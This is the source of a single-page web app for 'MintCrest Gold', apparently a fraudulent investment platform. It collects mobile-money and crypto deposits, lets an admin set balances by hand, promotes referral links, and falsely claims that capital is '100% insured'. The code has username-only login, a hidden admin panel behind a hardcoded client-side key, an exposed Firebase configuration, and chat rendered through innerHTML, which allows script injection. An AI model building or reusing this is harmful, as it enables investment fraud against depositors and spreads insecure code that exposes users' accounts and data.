<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <title>MintCrest Gold | Global Security Node</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #00040a; color: white; margin: 0; overflow: hidden; }
        .page-content { height: 100vh; overflow-y: scroll; padding-bottom: 150px; scroll-behavior: smooth; }
        ::-webkit-scrollbar { display: none; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); }
        .grad-main { background: linear-gradient(135deg, #0052d4 0%, #4364f7 50%, #6fb1fc 100%); }
        .page { display: none; animation: slideUp 0.4s ease; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .nav-btn { filter: grayscale(1); opacity: 0.4; transition: 0.4s; }
        .active-tab { filter: grayscale(0); opacity: 1; color: #00d4ff; }
        .chat-bubble { max-width: 80%; padding: 12px; border-radius: 20px; font-size: 11px; margin-bottom: 8px; line-height: 1.4; }
        .chat-user { background: #4364f7; align-self: flex-end; border-bottom-right-radius: 2px; }
        .chat-admin { background: rgba(255,255,255,0.1); align-self: flex-start; border-bottom-left-radius: 2px; }
    </style>
</head>
<body>

    <section id="auth-ui" class="fixed inset-0 z-[10000] bg-[#00040a] flex flex-col items-center justify-center p-8">
        <div class="w-20 h-20 grad-main rounded-[2rem] mb-6 flex items-center justify-center shadow-2xl animate-pulse">💎</div>
        <h1 onclick="adminTap()" class="text-4xl font-black italic tracking-tighter mb-2">MINTCREST</h1>
        <p class="text-[9px] uppercase tracking-[0.5em] text-blue-500 mb-10 font-bold">Secure Asset Node</p>
        <div class="glass p-8 rounded-[3rem] w-full max-w-xs text-center border-t border-white/20">
            <input type="text" id="user-name" placeholder="Username" class="w-full bg-white/5 p-4 rounded-2xl mb-4 text-center font-bold outline-none border border-white/10">
            <button onclick="login()" class="w-full grad-main py-4 rounded-2xl font-black uppercase text-xs shadow-xl active:scale-95 transition-all">Establish Link</button>
        </div>
    </section>

    <main id="app-ui" class="hidden relative">
        
        <div id="p-home" class="page active-page page-content p-6">
            <div class="flex justify-between items-center mt-4 mb-8">
                <div><h2 class="text-2xl font-black" id="v-user">User</h2><p class="text-[9px] text-green-400 font-bold uppercase">Node Online • Secured</p></div>
                <div class="flex gap-3">
                    <button onclick="changePage('chat')" class="text-2xl relative">💬<span class="absolute -top-1 -right-1 w-2 h-2 bg-rose-500 rounded-full"></span></button>
                </div>
            </div>
            <div class="grad-main p-8 rounded-[3rem] mb-8 shadow-2xl">
                <p class="text-[10px] font-black opacity-80 uppercase italic">Main Liquidity</p>
                <h2 class="text-5xl font-black my-2" id="v-bal">₨ 0</h2>
                <div class="mt-8 flex justify-between items-center pt-4 border-t border-white/10">
                    <p class="text-[10px] font-black uppercase">Profit: <span id="v-profit">₨ 0</span></p>
                    <button onclick="copyRef()" class="bg-black/20 px-4 py-2 rounded-xl text-[8px] font-black uppercase">🔗 Invite</button>
                </div>
            </div>
            
            <div class="glass p-5 rounded-[2rem] mb-8 border-l-4 border-cyan-400">
                <div class="flex items-center gap-3 mb-2">
                    <span class="text-xl">🛡️</span>
                    <h3 class="text-[10px] font-black uppercase tracking-widest text-cyan-400">Asset Protection Active</h3>
                </div>
                <p class="text-[9px] opacity-60 font-bold leading-relaxed italic">All nodes are encrypted with 256-bit SSL security. Your capital is 100% insured by MintCrest Reserve.</p>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass py-8 rounded-[2.5rem] font-black text-xs uppercase text-cyan-400">Deposit</button>
                <button onclick="changePage('withdraw')" class="glass py-8 rounded-[2.5rem] font-black text-xs uppercase text-rose-500">Withdraw</button>
            </div>
        </div>

        <div id="p-chat" class="page page-content flex flex-col h-screen">
            <div class="p-6 border-b border-white/10 flex justify-between items-center">
                <h3 class="font-black text-xl italic uppercase">Node Support</h3>
                <span class="text-[9px] bg-green-500/20 text-green-500 px-3 py-1 rounded-full font-black animate-pulse">LIVE ADMIN</span>
            </div>
            <div id="chat-box" class="flex-1 overflow-y-auto p-6 flex flex-col">
                </div>
            <div class="p-4 glass rounded-t-[2.5rem] border-t border-white/10">
                <div class="flex gap-2">
                    <label class="bg-white/5 p-4 rounded-2xl cursor-pointer">🖼️<input type="file" id="chat-img" class="hidden" accept="image/*" onchange="sendChatImg()"></label>
                    <input type="text" id="chat-msg" placeholder="Write message..." class="flex-1 bg-white/5 p-4 rounded-2xl text-xs outline-none border border-white/5">
                    <button onclick="sendChat()" class="grad-main px-6 rounded-2xl font-black">▶</button>
                </div>
            </div>
        </div>

        <div id="p-withdraw" class="page page-content p-6">
            <div class="glass p-8 rounded-[3.5rem] border-t-8 border-rose-600 text-center">
                <h3 class="text-2xl font-black text-rose-500 mb-6 uppercase italic">Cash Outflow</h3>
                <input type="text" id="w-user-auto" readonly class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center font-black opacity-40">
                <select id="w-method" class="w-full bg-white/10 p-4 rounded-xl mb-4 text-xs font-black outline-none border border-white/10">
                    <option value="Easypaisa">Easypaisa</option><option value="JazzCash">JazzCash</option><option value="Binance">Binance (USDT)</option>
                </select>
                <input type="number" id="w-amt" placeholder="Amount (Min 100)" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center font-bold border border-white/10">
                <input type="text" id="w-acc" placeholder="Account Details" class="w-full bg-white/5 p-4 rounded-xl mb-8 text-center text-xs font-bold border border-white/10">
                <button onclick="subWd()" class="w-full bg-rose-600 py-5 rounded-2xl font-black text-xs uppercase shadow-xl">Process Outflow</button>
            </div>
        </div>

        <div id="p-wallet" class="page page-content p-6"><h3 class="text-center font-black text-xl mb-8">Inflow</h3><div id="dep-box" class="glass p-8 rounded-[3rem]"><input type="number" id="d-amt" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center border border-white/10"><input type="text" id="d-tid" placeholder="TID" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center border border-white/10"><input type="file" id="d-file" class="w-full text-xs mb-6"><button onclick="subDep()" class="w-full grad-main py-5 rounded-2xl font-black uppercase text-xs">Verify Asset</button></div></div>
        <div id="p-activity" class="page page-content p-6"><h3 class="font-black text-xl mb-8 uppercase italic">History</h3><div id="user-history" class="space-y-3"></div></div>
        
        <div id="p-support" class="page page-content p-6 text-center">
            <div class="glass p-10 rounded-[3rem] border-t-4 border-green-500">
                <div class="text-5xl mb-6">📢</div>
                <h2 class="text-2xl font-black mb-2 uppercase">Official Updates</h2>
                <p class="text-[10px] opacity-60 mb-10 font-bold italic">Join our community for live signal nodes and updates.</p>
                <button onclick="window.open('https://chat.whatsapp.com/YOUR_GROUP')" class="w-full bg-green-600 py-5 rounded-3xl font-black text-xs uppercase shadow-xl flex items-center justify-center gap-3">
                    <span>🟢 WhatsApp Community</span>
                </button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#00040a] z-[50000] hidden overflow-y-auto p-8">
        <div class="flex justify-between items-center mb-8 border-b border-white/10 pb-6">
            <h2 class="text-xl font-black text-cyan-400 italic">ADMIN SUPREME</h2>
            <button onclick="closeAdm()" class="bg-rose-600 px-5 py-2 rounded-xl text-[10px] font-black">EXIT</button>
        </div>

        <div class="glass p-6 rounded-3xl mb-8 border-l-4 border-blue-500">
            <p class="text-[10px] font-black text-blue-400 mb-4 uppercase">💬 Internal Chat Node</p>
            <input type="text" id="adm-chat-u" placeholder="Target User Name" class="w-full bg-white/5 p-4 rounded-xl text-xs mb-3 border border-white/10 outline-none">
            <textarea id="adm-chat-msg" placeholder="Reply as Admin..." class="w-full bg-white/5 p-4 rounded-xl text-xs mb-3 border border-white/10 outline-none h-20"></textarea>
            <div class="grid grid-cols-2 gap-3">
                <button onclick="sendAdmChat()" class="grad-main py-4 rounded-xl text-[9px] font-black uppercase">Send Reply</button>
                <button onclick="clearChat()" class="bg-rose-600 py-4 rounded-xl text-[9px] font-black uppercase">Clear All Chat</button>
            </div>
        </div>

        <div id="adm-reqs" class="space-y-4"></div>
    </div>

    <nav id="bottom-nav" class="hidden glass p-7 flex justify-around items-center fixed bottom-0 w-full z-[2000] rounded-t-[3.5rem] border-t border-white/10">
        <button onclick="changePage('home')" id="n-home" class="nav-btn text-2xl">🏠</button>
        <button onclick="changePage('chat')" id="n-chat" class="nav-btn text-2xl">💬</button>
        <button onclick="changePage('activity')" id="n-activity" class="nav-btn text-2xl">📜</button>
        <button onclick="changePage('support')" id="n-support" class="nav-btn text-2xl">📢</button>
    </nav>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg",
            authDomain: "investment-84f4e.firebaseapp.com",
            projectId: "investment-84f4e",
            storageBucket: "investment-84f4e.firebasestorage.app",
            messagingSenderId: "975293889308",
            appId: "1:975293889308:web:6d034a99cc966c75ff58d9"
        };
        firebase.initializeApp(firebaseConfig); 
        const db = firebase.firestore(); const storage = firebase.storage();
        let user = null; let tapCount = 0;

        async function login() {
            const n = document.getElementById('user-name').value.trim().toLowerCase(); if(!n) return;
            const ref = db.collection("users").doc(n); const d = await ref.get();
            if(!d.exists) await ref.set({ name: n, balance: 0, profit: 0, time: Date.now() });
            user = (await ref.get()).data();
            document.getElementById('v-user').innerText = n.toUpperCase();
            document.getElementById('w-user-auto').value = "PAYEE: " + n.toUpperCase();
            document.getElementById('auth-ui').style.display='none';
            document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            startSync(n); syncChat(n);
        }

        // CHAT SYSTEM
        async function sendChat() {
            const m = document.getElementById('chat-msg').value; if(!m) return;
            await db.collection("chats").add({ user: user.name, msg: m, role: 'user', time: Date.now(), type: 'text' });
            document.getElementById('chat-msg').value = '';
        }

        async function sendChatImg() {
            const f = document.getElementById('chat-img').files[0]; if(!f) return;
            const sRef = storage.ref(`chats/${Date.now()}_${user.name}`); await sRef.put(f);
            const url = await sRef.getDownloadURL();
            await db.collection("chats").add({ user: user.name, msg: url, role: 'user', time: Date.now(), type: 'image' });
        }

        function syncChat(n) {
            db.collection("chats").where("user", "==", n).orderBy("time", "asc").onSnapshot(s => {
                const box = document.getElementById('chat-box'); box.innerHTML = '';
                s.forEach(d => {
                    const x = d.data();
                    const content = x.type === 'text' ? x.msg : `<img src="${x.msg}" class="rounded-lg w-full mt-1">`;
                    box.innerHTML += `<div class="chat-bubble ${x.role === 'user' ? 'chat-user' : 'chat-admin'}">${content}</div>`;
                });
                box.scrollTop = box.scrollHeight;
            });
        }

        // ADMIN CHAT CONTROL
        async function sendAdmChat() {
            const u = document.getElementById('adm-chat-u').value.toLowerCase();
            const m = document.getElementById('adm-chat-msg').value; if(!u || !m) return;
            await db.collection("chats").add({ user: u, msg: m, role: 'admin', time: Date.now(), type: 'text' });
            document.getElementById('adm-chat-msg').value = ''; alert("Reply Sent, Sweetie! 😘");
        }

        async function clearChat() {
            const u = document.getElementById('adm-chat-u').value.toLowerCase();
            if(!u) return alert("Enter Username to clear chat!");
            const s = await db.collection("chats").where("user", "==", u).get();
            s.forEach(d => d.ref.delete()); alert("Chat Node Cleared! 😘");
        }

        // DEPOSIT & WITHDRAWAL
        async function subDep() {
            const a = parseInt(document.getElementById('d-amt').value); const t = document.getElementById('d-tid').value; const f = document.getElementById('d-file').files[0];
            if(!a || !t || !f) return alert("Fill all details, Sweetie! 😘");
            const sRef = storage.ref(`proofs/${Date.now()}_${user.name}`); await sRef.put(f);
            const url = await sRef.getDownloadURL();
            await db.collection("requests").add({ user: user.name, amount: a, tid: t, proof: url, type: "Deposit", status: "pending", time: Date.now() });
            alert("Sent for Admin Verification! ✨"); location.reload();
        }

        async function subWd() {
            const a = parseInt(document.getElementById('w-amt').value); const acc = document.getElementById('w-acc').value; const m = document.getElementById('w-method').value;
            if(a < 100 || a > user.balance) return alert("Invalid Limit/Balance!");
            await db.collection("users").doc(user.name).update({ balance: user.balance - a });
            await db.collection("requests").add({ user: user.name, amount: a, acc: `${m}: ${acc}`, type: "Withdrawal", status: "pending", time: Date.now() });
            alert("Outflow Requested! 😘"); location.reload();
        }

        function startSync(n) {
            db.collection("users").doc(n).onSnapshot(d => { user = d.data(); document.getElementById('v-bal').innerText = "₨ "+(user.balance||0).toLocaleString(); document.getElementById('v-profit').innerText = "₨ "+(user.profit||0).toLocaleString(); });
            db.collection("requests").where("user", "==", n).orderBy("time", "desc").onSnapshot(s => {
                const l = document.getElementById('user-history'); l.innerHTML = '';
                s.forEach(d => { const x = d.data(); l.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center mb-2"><div class="text-left font-black text-[10px] uppercase"><span>${x.type}</span></div><span class="text-[9px] font-black ${x.status === 'pending' ? 'text-yellow-500' : 'text-green-500'} uppercase">${x.status}</span></div>`; });
            });
        }

        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("Secure Key:")==="mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdm(); } tapCount=0; } }
        function closeAdm() { document.getElementById('admin-panel').classList.add('hidden'); }

        function syncAdm() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(s => {
                const l = document.getElementById('adm-reqs'); l.innerHTML = '';
                s.forEach(d => { const x = d.data(); l.innerHTML += `<div class="glass p-6 rounded-[2rem] border-l-4 border-yellow-500"><p class="text-[10px] font-black uppercase text-cyan-400 mb-1">${x.user} | ${x.type}</p><p class="text-[9px] font-bold opacity-60">Amt: ${x.amount} | ID: ${x.tid || x.acc}</p>${x.proof ? `<a href="${x.proof}" target="_blank" class="block bg-cyan-600 text-center py-2 rounded-xl text-[8px] font-black mt-4 uppercase">Proof Image</a>` : ''}<div class="flex gap-2 mt-6"><button onclick="hnd('${d.id}','${x.user}',${x.amount},'approved','${x.type}')" class="flex-1 grad-main py-4 rounded-xl text-[9px] font-black uppercase">Approve</button><button onclick="hnd('${d.id}','${x.user}',${x.amount},'rejected','${x.type}')" class="flex-1 bg-rose-600 py-4 rounded-xl text-[9px] font-black uppercase">Reject</button></div></div>`; });
            });
        }

        async function hnd(id, u, amt, act, type) {
            const ref = db.collection("users").doc(u); const d = await ref.get();
            if(act==='approved' && type === "Deposit") await ref.update({ balance: (d.data().balance||0) + amt });
            else if(act==='rejected' && type === 'Withdrawal') await ref.update({ balance: (d.data().balance||0) + amt });
            await db.collection("requests").doc(id).update({ status: act });
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); document.getElementById('n-'+p).classList.add('active-tab'); }
        function copyRef() { navigator.clipboard.writeText(window.location.href + "?node=" + user.name); alert("Referral Link Copied! 🔗"); }
    </script>
</body>
</html>
